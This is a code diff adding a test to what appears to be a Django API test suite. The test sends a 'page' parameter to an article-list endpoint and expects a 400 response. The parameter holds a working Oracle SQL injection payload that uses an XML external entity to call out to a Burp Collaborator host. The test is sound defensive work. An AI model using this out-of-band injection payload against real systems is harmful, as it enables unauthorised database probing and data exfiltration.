@@ -766,3 +766,8 @@ class RequestArgs(base.BaseCase):
 
         resp = self.c.get(reverse('v2:article-list') + "?page=-1")
         self.assertEqual(resp.status_code, 400) # bad request
+
+    def test_view_malicious_string(self):
+        malicious_str = """1'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % gxurp SYSTEM "http://85br0ak8odwikzkm7mh80kqnfel8e024qvdm1b.burpcollab'||'orator.net/">%gxurp;]>'),'/l') from dual)||'"""
+        resp = self.c.get(reverse('v2:article-list'), {'page': malicious_str})
+        self.assertEqual(resp.status_code, 400) # bad request
